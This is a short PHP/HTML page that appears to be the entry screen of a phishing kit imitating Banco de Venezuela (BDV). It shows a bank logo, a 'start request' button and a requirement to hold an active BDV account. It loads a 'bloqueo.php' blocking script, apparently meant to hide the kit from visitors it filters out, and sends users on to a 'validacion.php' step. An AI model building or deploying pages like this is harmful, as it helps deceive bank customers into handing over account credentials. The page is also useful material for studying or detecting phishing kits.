<?php include 'bloqueo.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>BDVSOLICITUDES</title>
  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
  <link rel="icon" href="favicon.png" type="image/x-icon">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: url(background.webp);
      background-size: cover;
      background-position: center;
    }

    .container {
      display: flex;
      height: 100%;
      width: 80%;
    }

    .left-side {
      width: 40%;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .right-side {
      width: 30%;
    }

    .form {
      width: 80%;
      background: white;
      max-width: 550px;
      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
    }

    @media (max-width: 768px) {
      body {
        background: #ededed;
      }
      .container {
        flex-direction: column;
      }
      .left-side {
        width: 100%;
        height: 100vh;
      }
      .right-side {
        display: none;
      }
    }
  </style>
  <style>
    button {
      background-color: #0067b1;
      color: white;
      border-radius: 3px;
      border: 0;
      padding: 15px;
      width: 200px;
    }
	
  </style>
</head>
<body>
  <div class="container">
    <div class="left-side">
      <div class="form">
        <div style="text-align: center">
          <img src="logo.png" alt="" style="width: 90%; margin-top: 20px" />
        </div>
        <div style="width: 100%; text-align: center">
          <button type="button" id="entrarBtn" style="font-size: 18px;">Comenzar solicitud</button>
        </div>
        <div style="width: 100%; text-align: center; font-size: 12px; font-weight: bold; color: #707070; margin-top: 30px; margin-bottom: 30px;">
          REQUISITOS:<br />
		  • Poseer una cuenta BDV activa. <br />
		  
        </div>
      </div>
    </div>
    <div class="right-side"></div>
  </div>

  <!-- Script para redirigir al usuario al archivo indexnuevo -->
  <script>
    document.getElementById("entrarBtn").addEventListener("click", function() {
      window.location.href = "validacion.php";
    });
  </script>
</body>
</html>
